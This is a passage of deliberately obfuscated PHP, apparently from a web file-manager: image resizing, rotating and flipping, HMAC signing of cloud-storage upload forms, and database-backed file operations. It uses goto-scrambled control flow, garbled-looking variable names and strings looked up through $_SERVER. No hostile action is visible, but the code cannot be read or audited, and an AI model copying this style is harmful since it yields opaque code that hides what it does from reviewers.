imageCopyMerge($Eöœ×Ô‹„, $this->im, ($aò—é·ÇŠ - $bÈ‹Îõá°ƒ) / 2, $cøÛÜêŸË«, 0, 0, $bÈ‹Îõá°ƒ, $bˆô¬ÀµÖ, 100); } goto fäöè°¢´™; fäöè°¢´™: return $this->echoImage($Eöœ×Ô‹„, $cæ¼–ê®Œ–); goto d¦Æó¸©²œ; B×º°ˆ: if (function_exists($_SERVER[‡’¶øåüç˜][1877])) { @($Eöœ×Ô‹„ = imageCreateTrueColor($aò—é·ÇŠ, $fÔÓ•©ªÈ¢)); if (!$Eöœ×Ô‹„) { $Eöœ×Ô‹„ = imageCreate($aò—é·ÇŠ, $fÔÓ•©ªÈ¢); } } else { $Eöœ×Ô‹„ = imageCreate($aò—é·ÇŠ, $fÔÓ•©ªÈ¢); } $cøÛÜêŸË« = ($fÔÓ•©ªÈ¢ - $bˆô¬ÀµÖ) / 2; $bº™„å¢ï¿ = imagecolorallocate($Eöœ×Ô‹„, $FÒÒİ‘ñ£, $DÜ•âÒ‡Ö, $Cº¤¿ºñŞ×); goto D®¦³„ì…é; Aİ»ºÄ¨Ùª: $cÚªŠğÆåÓ = $aò—é·ÇŠ / $fÔÓ•©ªÈ¢; $bì©Î«Ù™Æ = $this->srcW / $this->srcH; if ($cÚªŠğÆåÓ <= $bì©Î«Ù™Æ) { $bÈ‹Îõá°ƒ = $aò—é·ÇŠ; $bˆô¬ÀµÖ = $bÈ‹Îõá°ƒ * ($this->srcH / $this->srcW); } else { $bˆô¬ÀµÖ = $fÔÓ•©ªÈ¢; $bÈ‹Îõá°ƒ = $bˆô¬ÀµÖ * ($this->srcW / $this->srcH); } goto B×º°ˆ; d¦Æó¸©²œ: } function creatImage($B–¸Î’„÷Á, $A­ĞëŠ«Û˜, $D¸Û¶Õ–æÌ, $B£‹È™Àëİ, $a¼×ÕÈÕÅÏ, $Dò›‰åô¿í, $DçèõÁñÇ´, $CÚ²®èğ»Û, $céÏ°Ê–†) { if (function_exists($_SERVER[‡’¶øåüç˜][1877])) { @($eí¿– çèÇ = ImageCreateTrueColor($A­ĞëŠ«Û˜, $D¸Û¶Õ–æÌ)); @imagealphablending($eí¿– çèÇ, !1); @imagesavealpha($eí¿– çèÇ, !0); if ($eí¿– çèÇ) { imageCopyResampled($eí¿– çèÇ, $B–¸Î’„÷Á, $B£‹È™Àëİ, $a¼×ÕÈÕÅÏ, $Dò›‰åô¿í, $DçèõÁñÇ´, $A­ĞëŠ«Û˜, $D¸Û¶Õ–æÌ, $CÚ²®èğ»Û, $céÏ°Ê–†); } else { $eí¿– çèÇ = ImageCreate($A­ĞëŠ«Û˜, $D¸Û¶Õ–æÌ); imageCopyResized($eí¿– çèÇ, $B–¸Î’„÷Á, $B£‹È™Àëİ, $a¼×ÕÈÕÅÏ, $Dò›‰åô¿í, $DçèõÁñÇ´, $A­ĞëŠ«Û˜, $D¸Û¶Õ–æÌ, $CÚ²®èğ»Û, $céÏ°Ê–†); } } else { $eí¿– çèÇ = ImageCreate($A­ĞëŠ«Û˜, $D¸Û¶Õ–æÌ); imageCopyResized($eí¿– çèÇ, $B–¸Î’„÷Á, $B£‹È™Àëİ, $a¼×ÕÈÕÅÏ, $Dò›‰åô¿í, $DçèõÁñÇ´, $A­ĞëŠ«Û˜, $D¸Û¶Õ–æÌ, $CÚ²®èğ»Û, $céÏ°Ê–†); } return $eí¿– çèÇ; } public function imgRotate($F×©ÓØ£¸, $a†×ÅêØ¨) { goto AŸ…É‘ ”; AŸ…É‘ ”: if (!$this->im || $a†×ÅêØ¨ % 360 === 0 || !function_exists($_SERVER[‡’¶øåüç˜][1876])) { return !1; } $f§£ÕäÁŸ = imageRotate($this->im, 360 - $a†×ÅêØ¨, 0); $eãµ‘êñÇ = !1; goto dÇš‹¦‘Ç; dÇš‹¦‘Ç: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $eãµ‘êñÇ = imagegif($f§£ÕäÁŸ, $F×©ÓØ£¸); break; case IMAGETYPE_JPEG: $eãµ‘êñÇ = imagejpeg($f§£ÕäÁŸ, $F×©ÓØ£¸, 100); break; case IMAGETYPE_PNG: $eãµ‘êñÇ = imagePNG($f§£ÕäÁŸ, $F×©ÓØ£¸); break; default: break; } imageDestroy($f§£ÕäÁŸ); imageDestroy($this->im); goto FĞªÌğ×ï; FĞªÌğ×ï: return $eãµ‘êñÇ; goto FòÚÖ“â»; FòÚÖ“â»: } function echoImage($FÓ¿«…ß´‚, $F‘Úã¢Ë¤Ó) { goto FÉßç×¶ÄŸ; FÉßç×¶ÄŸ: $AëêÑªƒ—‰ =& $_SERVER[‡’¶øåüç˜]; if (!$FÓ¿«…ß´‚) { return !1; } ob_get_clean(); goto CˆŒ§ŒÅã; CˆŒ§ŒÅã: $Dœñ„„•äÒ = !1; $E›ŒŠÒñ®ì = 90; switch ($this->echoType) { case $AëêÑªƒ—‰[1878]: $Dœñ„„•äÒ = imagejpeg($FÓ¿«…ß´‚, null, $E›ŒŠÒñ®ì); break; case $AëêÑªƒ—‰[171]: $Dœñ„„•äÒ = imagejpeg($FÓ¿«…ß´‚, $F‘Úã¢Ë¤Ó, $E›ŒŠÒñ®ì); break; } goto B©ãĞù´½; B©ãĞù´½: imageDestroy($FÓ¿«…ß´‚); imageDestroy($this->im); return $Dœñ„„•äÒ; goto F…¡‡´•öò; F…¡‡´•öò: } } if (!function_exists($_SERVER[‡’¶øåüç˜][1879])) { define($_SERVER[‡’¶øåüç˜][1880], 0); define($_SERVER[‡’¶øåüç˜][1881], 1); define($_SERVER[‡’¶øåüç˜][1882], 2); function imageflip($A¼„ÃêĞò, $Cèã¸Ã„ó†) { switch ($Cèã¸Ã„ó†) { case IMG_FLIP_HORIZONTAL: $dÜ£ˆÛõ… = imagesx($A¼„ÃêĞò) - 1; $a¸º„ˆ•äî = $dÜ£ˆÛõ… / 2; $dŞƒîï¶Á = imagesy($A¼„ÃêĞò); $Fï¢ñëÁñ = imageistruecolor($A¼„ÃêĞò) ? imagecreatetruecolor(1, $dŞƒîï¶Á) : imagecreate(1, $dŞƒîï¶Á); for ($eù³¾ÉñÕå = 0; $eù³¾ÉñÕå < $a¸º„ˆ•äî; ++$eù³¾ÉñÕå) { imagecopy($Fï¢ñëÁñ, $A¼„ÃêĞò, 0, 0, $eù³¾ÉñÕå, 0, 1, $dŞƒîï¶Á); imagecopy($A¼„ÃêĞò, $A¼„ÃêĞò, $eù³¾ÉñÕå, 0, $dÜ£ˆÛõ… - $eù³¾ÉñÕå, 0, 1, $dŞƒîï¶Á); imagecopy($A¼„ÃêĞò, $Fï¢ñëÁñ, $dÜ£ˆÛõ… - $eù³¾ÉñÕå, 0, 0, 0, 1, $dŞƒîï¶Á); } break; case IMG_FLIP_VERTICAL: $e˜à¦ÇÈİ = imagesx($A¼„ÃêĞò); $E‘½ÚÔ­ÓÌ = imagesy($A¼„ÃêĞò) - 1; $AÒã®¼‰Í = $E‘½ÚÔ­ÓÌ / 2; $Fï¢ñëÁñ = imageistruecolor($A¼„ÃêĞò) ? imagecreatetruecolor($e˜à¦ÇÈİ, 1) : imagecreate($e˜à¦ÇÈİ, 1); for ($dâ…ƒÏœêÛ = 0; $dâ…ƒÏœêÛ < $AÒã®¼‰Í; ++$dâ…ƒÏœêÛ) { imagecopy($Fï¢ñëÁñ, $A¼„ÃêĞò, 0, 0, 0, $dâ…ƒÏœêÛ, $e˜à¦ÇÈİ, 1); imagecopy($A¼„ÃêĞò, $A¼„ÃêĞò, 0, $dâ…ƒÏœêÛ, 0, $E‘½ÚÔ­ÓÌ - $dâ…ƒÏœêÛ, $e˜à¦ÇÈİ, 1); imagecopy($A¼„ÃêĞò, $Fï¢ñëÁñ, 0, $E‘½ÚÔ­ÓÌ - $dâ…ƒÏœêÛ, 0, 0, $e˜à¦ÇÈİ, 1); } break; case IMG_FLIP_BOTH: $e˜à¦ÇÈİ = imagesx($A¼„ÃêĞò); $dŞƒîï¶Á = imagesy($A¼„ÃêĞò); $Fï¢ñëÁñ = imagerotate($A¼„ÃêĞò, 180, 0); imagecopy($A¼„ÃêĞò, $Fï¢ñëÁñ, 0, 0, 0, 0, $e˜à¦ÇÈİ, $dŞƒîï¶Á); break; default: return; } imagedestroy($Fï¢ñëÁñ); } } if (!function_exists($_SERVER[‡’¶øåüç˜][1883])) { function imagecreatefrombmp($c¨ì…éïÙ) { return ImageGdBMP::load($c¨ì…éïÙ); } } goto c²¤ÕùÉÁÙ; d”«…ôÖÃğ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($D²ğ•‰µŒ”) { parent::__construct($D²ğ•‰µŒ”); $this->signatureVersion($_SERVER[‡’¶øåüç˜][204]); } public function uploadFormData($fæ½Íå‹ã, $B“ëŞ÷¯¯Ç = 3600) { goto FçÇ²‰–×; e†¨¤‚½·: $B‡íÏØ¸Ã = $d¹œÆŒ†µ„[1107]; $cî¶ßÂÖæÌ = gmdate($d¹œÆŒ†µ„[1108], time() + $B“ëŞ÷¯¯Ç); $a¯…×¶á¸‘ = (string) time() . $d¹œÆŒ†µ„[67] . (string) (time() + $B“ëŞ÷¯¯Ç); goto Bóß–ŒÅ…; Bóß–ŒÅ…: $CáÇæ‚œ³’ = array($d¹œÆŒ†µ„[1109] => $cî¶ßÂÖæÌ, $d¹œÆŒ†µ„[1110] => array(array($d¹œÆŒ†µ„[1111] => $FĞä½¥Õêœ), array($d¹œÆŒ†µ„[1112] => $this->bucket), array($d¹œÆŒ†µ„[1113], $d¹œÆŒ†µ„[1114], $d¹œÆŒ†µ„[33]), array($d¹œÆŒ†µ„[1115] => $B‡íÏØ¸Ã), array($d¹œÆŒ†µ„[1116] => $aö‘Œ„¨©), array($d¹œÆŒ†µ„[1117] => $this->accessKey), array($d¹œÆŒ†µ„[1118] => $a¯…×¶á¸‘))); $CáÇæ‚œ³’ = json_encode($CáÇæ‚œ³’); $fæìªïó’ = hash_hmac($d¹œÆŒ†µ„[222], $a¯…×¶á¸‘, $this->secret); goto DŠ°•Ğîõ; FçÇ²‰–×: $d¹œÆŒ†µ„ =& $_SERVER[‡’¶øåüç˜]; $FĞä½¥Õêœ = $d¹œÆŒ†µ„[189]; $aö‘Œ„¨© = $d¹œÆŒ†µ„[222]; goto e†¨¤‚½·; DŠ°•Ğîõ: $Cš«Å°¿³‡ = sha1($CáÇæ‚œ³’); $eø°¶ÏƒÄ = hash_hmac($d¹œÆŒ†µ„[222], $Cš«Å°¿³‡, $fæìªïó’); $C‚µÛŠ·ß = array($d¹œÆŒ†µ„[1111] => $FĞä½¥Õêœ, $d¹œÆŒ†µ„[1115] => $B‡íÏØ¸Ã, $d¹œÆŒ†µ„[1119] => base64_encode($CáÇæ‚œ³’), $d¹œÆŒ†µ„[1116] => $aö‘Œ„¨©, $d¹œÆŒ†µ„[1117] => $this->accessKey, $d¹œÆŒ†µ„[1120] => $a¯…×¶á¸‘, $d¹œÆŒ†µ„[1121] => $eø°¶ÏƒÄ, $d¹œÆŒ†µ„[173] => $this->getHost()); goto cÅ°Œ İì; cÅ°Œ İì: return $C‚µÛŠ·ß; goto AÒŸÆ¤Úİà; AÒŸÆ¤Úİà: } public function fileOutLink($F¦Û™¬æ¦—) { $Dº¡œˆÔä =& $_SERVER[‡’¶øåüç˜]; if (substr($F¦Û™¬æ¦—, 0, 7) == $Dº¡œˆÔä[1122]) { $F¦Û™¬æ¦— = $Dº¡œˆÔä[1123] . substr($F¦Û™¬æ¦—, 7); } header($Dº¡œˆÔä[156] . $F¦Û™¬æ¦—); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($eÜµ®†İŸ) { $this->pathParse = $eÜµ®†İŸ; $this->model = Model($_SERVER[‡’¶øåüç˜][1124]); } public function getPath($eÅëÌâ…Á) { return trim($eÅëÌâ…Á, $_SERVER[‡’¶øåüç˜][8]); } public function pathFather($Cô„¤…ôêù) { $dÌ¼ÜÊ¶ = $this->parse($Cô„¤…ôêù); $dÌ¼ÜÊ¶ = $this->infoSimple($Cô„¤…ôêù); return $dÌ¼ÜÊ¶ ? $dÌ¼ÜÊ¶[$_SERVER[‡’¶øåüç˜][474]] : !1; } public function getPathName($fóÜ³µå™) { $eÄğÖÈëâŒ = $this->infoSimple($fóÜ³µå™); return $eÄğÖÈëâŒ ? $eÄğÖÈëâŒ[$_SERVER[‡’¶øåüç˜][28]] : !1; } public function getPathOuter($e©Ñ›×ŒÔ§) { if (!$e©Ñ›×ŒÔ§) { return $e©Ñ›×ŒÔ§; } $a§©È®‚¦ğ = $this->parse($e©Ñ›×ŒÔ§); return KodIO::make($a§©È®‚¦ğ[$_SERVER[‡’¶øåüç˜][371]]); } public function copyFolderFromIO($fõ•¬ÄÃ®, $eğ¼¶»éÑÌ, $dØææ¥¥Ü, $FçåçµÉ è, $fÆ•‘”…¿) { $Fèœ”ŠÒĞ = $this->model->copyFolderFromIO($fõ•¬ÄÃ®, $eğ¼¶»éÑÌ, $dØææ¥¥Ü, $FçåçµÉ è, $fÆ•‘”…¿); return KodIO::make($Fèœ”ŠÒĞ); } public function isParentOf($b¬ÄŸ×À‚, $dØ¤£÷¡¸¸) { return $this->model->isParentOf($b¬ÄŸ×À‚, $dØ¤£÷¡¸¸); } public function mkfile($Eè½Ü×öî, $D‡àªÔ·ò = '', $Dá¿‰¢šÒ² = REPEAT_RENAME) { $c»³Å°öâø =& $_SERVER[‡’¶øåüç˜]; $d‹©‘½¢Ûé = $this->parse($Eè½Ü×öî); $Eè½Ü×öî = $d‹©‘½¢Ûé[$c»³Å°öâø[371]]; for ($A­¤õ¢‘“ï = 0; $A­¤õ¢‘“ï < count($d‹©‘½¢Ûé[$c»³Å°öâø[1125]]); $A­¤õ¢‘“ï++) { $B‘ø‘±£ìº = $d‹©‘½¢Ûé[$c»³Å°öâø[1125]][$A­¤õ¢‘“ï]; if ($A­¤õ¢‘“ï == count($d‹©‘½¢Ûé[$c»³Å°öâø[1125]]) - 1) { $Eè½Ü×öî = $this->model->mkfile($Eè½Ü×öî, $B‘ø‘±£ìº, $D‡àªÔ·ò, $Dá¿‰¢šÒ²); break; } $Eè½Ü×öî = $this->model->mkdir($Eè½Ü×öî, $B‘ø‘±£ìº, REPEAT_SKIP); } return $this->getPathOuter($Eè½Ü×öî); } public function mkdir($cÉè‹Æíİ©, $e¥ªø÷†‰İ = REPEAT_SKIP) { $A‡Úİ³®ÎÂ =& $_SERVER[‡’¶øåüç˜]; $a¹Ì¹•äåƒ = $this->parse($cÉè‹Æíİ©); $cÉè‹Æíİ© = $a¹Ì¹•äåƒ[$A‡Úİ³®ÎÂ[371]]; for ($bÅôÃœÃÇ = 0; $bÅôÃœÃÇ < count($a¹Ì¹•äåƒ[$A‡Úİ³®ÎÂ[1125]]); $bÅôÃœÃÇ++) { $a¡«ŒœÜ×á = $a¹Ì¹•äåƒ[$A‡Úİ³®ÎÂ[1125]][$bÅôÃœÃÇ]; $cÉè‹Æíİ© = $this->model->mkdir($cÉè‹Æíİ©, $a¡«ŒœÜ×á, $e¥ªø÷†‰İ); } return $this->getPathOuter($cÉè‹Æíİ©); } public function copyFile($C¢‡¢·ó¶¯, $BÅöâèÃ•À, $b—¶ÓëˆŒ˜ = REPEAT_REPLACE) { $fÅĞğÊÑ =& $_SERVER[‡’¶øåüç˜]; $FÍìññõ½á = $this->parse($BÅöâèÃ•À); $Eˆ¢ÀÌè…÷ = $this->model->copy($C¢‡¢·ó¶¯, $FÍìññõ½á[$fÅĞğÊÑ[371]], $b—¶ÓëˆŒ˜, $FÍìññõ½á[$fÅĞğÊÑ[75]]); return $Eˆ¢ÀÌè…÷ ? $this->getPathOuter($Eˆ¢ÀÌè…÷) : !1; } public function moveFile($DÇÖçÑĞ, $a•‡İî° ó, $cŸ–Ñ›ç¦Ú = REPEAT_REPLACE) { $dö²îïº„Á =& $_SERVER[‡’¶øåüç˜]; $cœµ¢òå‹¤ = $this->parse($a•‡İî° ó); $dôÈŠ®Ë´Ç = $this->model->move($DÇÖçÑĞ, $cœµ¢òå‹¤[$dö²îïº„Á[371]], $cŸ–Ñ›ç¦Ú, $cœµ¢òå‹¤[$dö²îïº„Á[75]]); return $dôÈŠ®Ë´Ç ? $this->getPathOuter($dôÈŠ®Ë´Ç) : !1; } public function copy($cÜëÊÄèã¨, $D³•¾øç®, $f»æòÀ’ƒ‰ = REPEAT_REPLACE) { $bö¹†¢ÍËº = $this->parse($D³•¾øç®); $b‚ĞÀÏÔ× = $this->model->copy($cÜëÊÄèã¨, $bö¹†¢ÍËº[$_SERVER[‡’¶øåüç˜][371]], $f»æòÀ’ƒ‰); return $b‚ĞÀÏÔ× ? $this->getPathOuter($b‚ĞÀÏÔ×) : !1; } public function moveSameAllow() { } public function move($cäğô¬ªËï, $FŞäˆ‚½ ‹, $f½òÆÑ ˜ = REPEAT_REPLACE) { $BÜ‚éÚß¥ç = $this->parse($FŞäˆ‚½ ‹); $c“†÷ŸÅ¡í = $this->model->move($cäğô¬ªËï, $BÜ‚éÚß¥ç[$_SERVER[‡’¶øåüç˜][371]], $f½òÆÑ ˜); return $c“†÷ŸÅ¡í ? $this->getPathOuter($c“†÷ŸÅ¡í) : !1; } public function remove($d¢£ØÖÒà², $eÇ˜ßìô—™ = true) { return $this->model->remove($d¢£ØÖÒà², $eÇ˜ßìô—™); } public function rename($D Ğæ·Ñ³™, $b×ØÎ‰‰Ş·) { $e·‘º……ÑÎ = $this->model->rename($D Ğæ·Ñ³™, $b×ØÎ‰‰Ş·); return $e·‘º……ÑÎ ? $this->getPathOuter($D Ğæ·Ñ³™) : $e·‘º……ÑÎ; } public function size($E°ôÜÖéæ) { $Dã“İŒ‚¿» = $this->infoSimple($E°ôÜÖéæ); return $Dã“İŒ‚¿» ? $Dã“İŒ‚¿»[$_SERVER[‡’¶øåüç˜][77]] : 0; } public function infoSimple($B‡¨İòÂİ«) { return $this->model->sourceInfo($B‡¨İòÂİ«); } public function info($e¼™‘ºğ³Ã) { return $this->infoParse($e¼™‘ºğ³Ã); } public function infoAuth($B¥ŞĞéå‡Ù) { return $this->infoParse($B¥ŞĞéå‡Ù, !1, !0); } public function infoWithChildren($cªÚÉåïé) { return $this->infoParse($cªÚÉåïé, !0); } protected function infoParse($dİáøÆÏÉ¨, $dÇò˜’©½• = false, $FÌ‰»Ê¯¢É = false) { if (!$dÇò˜’©½•) { return $this->model->pathInfo($dİáøÆÏÉ¨, $FÌ‰»Ê¯¢É); } return $this->model->pathInfoMore($dİáøÆÏÉ¨); } public function infoFull($Cö °¡ñ¿â) { $C´‰ÃÖ’§ì =& $_SERVER[‡’¶øåüç˜]; $Bªƒª×µ‚ë = explode($C´‰ÃÖ’§ì[8], $Cö °¡ñ¿â); $båî´Óëñ… = implode($C´‰ÃÖ’§ì[8], array_splice($Bªƒª×µ‚ë, 1)); return $this->model->pathInfoByPath($Bªƒª×µ‚ë[0], $båî´Óëñ…); } public function hashSimple($f¥Íè°……¾) { $e ò¶“¼ÜÒ =& $_SERVER[‡’¶øåüç˜]; $bªé›ã„“ = $this->infoWithChildren($f¥Íè°……¾); return $bªé›ã„“[$e ò¶“¼ÜÒ[161]][$e ò¶“¼ÜÒ[168]]; } public function hashMd5($FåÏÛßŠ®Ç) { $B‰Ê°áÑÁ© =& $_SERVER[‡’¶øåüç˜]; $f“ÄÅ¬ìŠ = $this->infoWithChildren($FåÏÛßŠ®Ç); return $f“ÄÅ¬ìŠ[$B‰Ê°áÑÁ©[161]][$B‰Ê°áÑÁ©[167]]; } public function exist($dó…ÂªË›) { $cæÛ¶ñ¾Ô» =& $_SERVER[‡’¶øåüç˜]; $bíêÄ…Ø™‰ = $this->parse($dó…ÂªË›); if (!$bíêÄ…Ø™‰[$cæÛ¶ñ¾Ô»[75]]) { return $this->isFile($dó…ÂªË›) || $this->isFolder($dó…ÂªË›); } $a÷†Â¸ğ÷× = array($cæÛ¶ñ¾Ô»[380] => $bíêÄ…Ø™‰[$cæÛ¶ñ¾Ô»[371]], $cæÛ¶ñ¾Ô»[28] => $bíêÄ…Ø™‰[$cæÛ¶ñ¾Ô»[75]]); $B¼¢ƒÚ›ÅÓ = $this->model->where($a÷†Â¸ğ÷×)->find(); return $B¼¢ƒÚ›ÅÓ ? !0 : !1; } public function isFile($b‰÷¾‹®ÙØ) { $A‚å½Å¢Õ =& $_SERVER[‡’¶øåüç˜]; $bñ˜ÑØå³ë = $this->infoSimple($b‰÷¾‹®ÙØ); return $bñ˜ÑØå³ë && $bñ˜ÑØå³ë[$A‚å½Å¢Õ[382]] == $A‚å½Å¢Õ[83] ? !1 : !0; } public function isFolder($Cê’½ƒ‚•Ì) { $a†¡Š‚æ£ =& $_SERVER[‡’¶øåüç˜]; $AÛò‚â²¶ô = $this->infoSimple($Cê’½ƒ‚•Ì); return $AÛò‚â²¶ô && $AÛò‚â²¶ô[$a†¡Š‚æ£[382]] == $a†¡Š‚æ£[83] ? !0 : !1; } public function listPath($A³äø‚³–Æ, $e„©‹ˆÀ˜× = false) { $BŸ¢¬ŸÉË¾ =& $_SERVER[‡’¶øåüç˜]; if ($A³äø‚³–Æ == $BŸ¢¬ŸÉË¾[33]) { return !1; } $aÕ¡³©±¾Ï = array($BŸ¢¬ŸÉË¾[380] => $A³äø‚³–Æ); if ($e„©‹ˆÀ˜×) { return $this->model->listSource($aÕ¡³©±¾Ï, -1); } return $this->model->listSource($aÕ¡³©±¾Ï); } public function has($C×¼Ë’‹’î, $Cê¸È«Î´Á = false, $d„‰Íò™‰Á = null) { $c°ï¢„„‘ï =& $_SERVER[‡’¶øåüç˜]; $FìÅÓ–Ã˜Á = $this->infoWithChildren($C×¼Ë’‹’î); if ($Cê¸È«Î´Á) { return array($c°ï¢„„‘ï[196] => $FìÅÓ–Ã˜Á[$c°ï¢„„‘ï[196]], $c°ï¢„„‘ï[195] => $FìÅÓ–Ã˜Á[$c°ï¢„„‘ï[195]]); } return $d„‰Íò™‰Á ? $FìÅÓ–Ã˜Á[$c°ï¢„„‘ï[196]] : $FìÅÓ–Ã˜Á[$c°ï¢„„‘ï[195]]; } public function listAll($aÍ÷¶Ò¿À) { $aÄ‹š¸‡ß = IO::info($this->pathParse[$_SERVER[‡’¶øåüç˜][75]]); if (!$aÄ‹š¸‡ß) { return array(); } return $this->model->listAll($aÍ÷¶Ò¿À); } public function getContent($A‰°ŠÆÚŒâ) { return $this->model->getContent($A‰°ŠÆÚŒâ); } public function setContent($fŠ‰§Ìâ•, $cÄ„¥†¡éì = '') { return $this->model->setContent($fŠ‰§Ìâ•, $cÄ„¥†¡éì); } public function fileSubstr($cƒßŸ±ÏˆÏ, $DÉ†Ò ä’, $e®ÃÌëİÅ½) { return $this->model->fileSubstr($cƒßŸ±ÏˆÏ, $DÉ†Ò ä’, $e®ÃÌëİÅ½); } public function download($B´†îÔª›É, $D½¯ŒÜ¦ = '') { $a¬âğëÏˆâ = get_path_father($D½¯ŒÜ¦); $e˜ÆòàÍë§ = get_path_this($D½¯ŒÜ¦); $Eõ›è„¼ = $this->model->fileInfoGet($B´†îÔª›É); $F¾ƒä²Ò¨ = IO::copy($Eõ›è„¼[$_SERVER[‡’¶øåüç˜][75]], $a¬âğëÏˆâ, !1, $e˜ÆòàÍë§); return $F¾ƒä²Ò¨; } public function setModifyTime($fù»Š§÷İˆ, $f¿ã…É‘ïâ = '') { $this->model->metaSet($fù»Š§÷İˆ, $_SERVER[‡’¶øåüç˜][1126], $f¿ã…É‘ïâ); } public function upload($CÍÆˆÚËôí, $fÃñ©ŠÙçÈ, $A™›…ğÜ‡Í = false, $cÂ…ÅÎÒƒ¢ = REPEAT_REPLACE) { $B¬œ¯³£êÂ =& $_SERVER[‡’¶øåüç˜]; $a‰À»ó”—Ñ = $this->parse($CÍÆˆÚËôí); $F…Û‡ØÅ™¦ = $this->model->addFile($a‰À»ó”—Ñ[$B¬œ¯³£êÂ[371]], $fÃñ©ŠÙçÈ, $a‰À»ó”—Ñ[$B¬œ¯³£êÂ[75]], $A™›…ğÜ‡Í, $cÂ…ÅÎÒƒ¢); return $this->getPathOuter($F…Û‡ØÅ™¦); } public function uploadFileByID($cŒ÷•¹‹ÙÁ, $B¢Å¿Å¡, $D‚Ù×Ãğáô) { $f˜İ‚Ùİ =& $_SERVER[‡’¶øåüç˜]; $AÇÓ»¶æ = $this->parse($cŒ÷•¹‹ÙÁ); $C›ò«ŞÆ•° = $this->model->addFileByFileID($AÇÓ»¶æ[$f˜İ‚Ùİ[371]], $B¢Å¿Å¡, $AÇÓ»¶æ[$f˜İ‚Ùİ[75]], $D‚Ù×Ãğáô); return $this->getPathOuter($C›ò«ŞÆ•°); } public function addFileByRemote($cŠ‹’ä¯Ö‰, $f£Ø‹“ğÚ©, $Aö×Ğì× = array(), $f»î˜°áñ = '', $Dí¹ß»‰¡) { $E­š¿¡šŠ =& $_SERVER[‡’¶øåüç˜]; $EÑÖ•É“Çø = $this->parse($cŠ‹’ä¯Ö‰); $f»î˜°áñ = empty($f»î˜°áñ) ? $EÑÖ•É“Çø[$E­š¿¡šŠ[75]] : $f»î˜°áñ; $a×¸‡¸Èœµ = $this->model->addFileByRemote($EÑÖ•É“Çø[$E­š¿¡šŠ[371]], $f£Ø‹“ğÚ©, $f»î˜°áñ, $Aö×Ğì×, $Dí¹ß»‰¡); return $this->getPathOuter($a×¸‡¸Èœµ); } public function uploadLink($fÅËÕ™Ã„Œ, $dÜÂ¾ª«Ë = 0) { $EÀğœ¡£óÕ =& $_SERVER[‡’¶øåüç˜]; $B–ŠºÎ¢™ = $this->parse($fÅËÕ™Ã„Œ); $fÅËÕ™Ã„Œ = Model($EÀğœ¡£óÕ[556])->createFileName($B–ŠºÎ¢™[$EÀğœ¡£óÕ[75]]); $F®Ô±•ß‘æ = IO::uploadLink($fÅËÕ™Ã„Œ, $dÜÂ¾ª«Ë); return $F®Ô±•ß‘æ; } public function fileNameAuto($AÛâåºòº£, $c¸¡¸ÑŠ¶, $DÖ¾ÕÍ×—Ë = REPEAT_REPLACE, $C‚ÔµÂø¿ = false) { return $this->model->fileNameAuto($AÛâåºòº£, $c¸¡¸ÑŠ¶, $DÖ¾ÕÍ×—Ë, $C‚ÔµÂø¿); } public function fileNameExist($e¯ò‚®íšÓ, $D‰¢¤æˆå“) { return $this->model->fileNameExist($e¯ò‚®íšÓ, $D‰¢¤æˆå“); } protected function _fileOut($cîÒõÎ¡·Ö, $dŠÑñµ = false, $e„¦í„Ûé = false, $B×‡Ø¦áğ‰ = '', $f½Ù¢¼¿¸ = false) { goto fİŸìŞ…„³; EŸåÃŸ»Ç : $fº¶™¼Ù—º = $this->model->fileInfoGet($cîÒõÎ¡·Ö); $B×‡Ø¦áğ‰ = $fº¶™¼Ù—º[$d×¿¿»±ƒ¾[167]] ? $fº¶™¼Ù—º[$d×¿¿»±ƒ¾[167]] : $B×‡Ø¦áğ‰; $Aª±¦õ¤¿ª = isset($GLOBALS[$d×¿¿»±ƒ¾[1128]]) ? $GLOBALS[$d×¿¿»±ƒ¾[1128]] : $F½Ë¼ÊÄÂ¤[$d×¿¿»±ƒ¾[28]]; goto aÄÂ›×¤Å ; aÄÂ›×¤Å : if ($f½Ù¢¼¿¸) { return IO::fileOutServer($fº¶™¼Ù—º[$d×¿¿»±ƒ¾[75]], $dŠÑñµ, $Aª±¦õ¤¿ª, $B×‡Ø¦áğ‰); } IO::fileOut($fº¶™¼Ù—º[$d×¿¿»±ƒ¾[75]], $dŠÑñµ, $Aª±¦õ¤¿ª, $B×‡Ø¦áğ‰); goto b„îÌ˜Ú“è; fİŸìŞ…„³: $d×¿¿»±ƒ¾ =& $_SERVER[‡’¶øåüç˜]; $F½Ë¼ÊÄÂ¤ = $this->model->sourceInfo($cîÒõÎ¡·Ö); if ($F½Ë¼ÊÄÂ¤[$d×¿¿»±ƒ¾[382]] == $d×¿¿»±ƒ¾[83]) { header($d×¿¿»±ƒ¾[1127]); die; } goto EŸåÃŸ»Ç ; b„îÌ˜Ú“è: } public function fileOut($aÉ«ö°‹§, $Dùì›Ë¹Ÿš = false, $dÇàˆòùÂ£ = false, $Eµ½™Ó¾§à = '') { $this->_fileOut($aÉ«ö°‹§, $Dùì›Ë¹Ÿš, $dÇàˆòùÂ£, $Eµ½™Ó¾§à); } public function fileOutServer($c”×Èãù„ˆ, $E·Ôõ—ŒÓÊ = false, $DÚƒ–ŞâÂĞ = false, $Cï¦œ¢‡â— = '') { $this->_fileOut($c”×Èãù„ˆ, $E·Ôõ—ŒÓÊ, $DÚƒ–ŞâÂĞ, $Cï¦œ¢‡â—, !0); } protected function _fileOutImage($aÎ¥¦ˆ¬‚¹, $e­ö¶„Û˜Ù = 250) { goto b„“ÂÕÜë‘; Aª‚ô¨Õ­ñ: $GLOBALS[$CàÔèó¼•÷[1128]] = $FôãÈ’Õ¡Ÿ[$CàÔèó¼•÷[28]]; $GLOBALS[$CàÔèó¼•÷[159]] = $FôãÈ’Õ¡Ÿ; IO::fileOutImage($FôãÈ’Õ¡Ÿ[$CàÔèó¼•÷[75]], $e­ö¶„Û˜Ù); goto d´¡Îè£ù; b„“ÂÕÜë‘: $CàÔèó¼•÷ =& $_SERVER[‡’¶øåüç˜]; $B‚‡Õ‡ƒÓ­ = $this->model->pathInfo($aÎ¥¦ˆ¬‚¹); if ($B‚‡Õ‡ƒÓ­[$CàÔèó¼•÷[382]] == $CàÔèó¼•÷[83]) { show_json($CàÔèó¼•÷[1129] . $aÎ¥¦ˆ¬‚¹, !1); } goto AÂÖß×·ŸÌ; AÂÖß×·ŸÌ: $FôãÈ’Õ¡Ÿ = $this->model->fileInfoGet($aÎ¥¦ˆ¬‚¹); $FôãÈ’Õ¡Ÿ[$CàÔèó¼•÷[28]] = 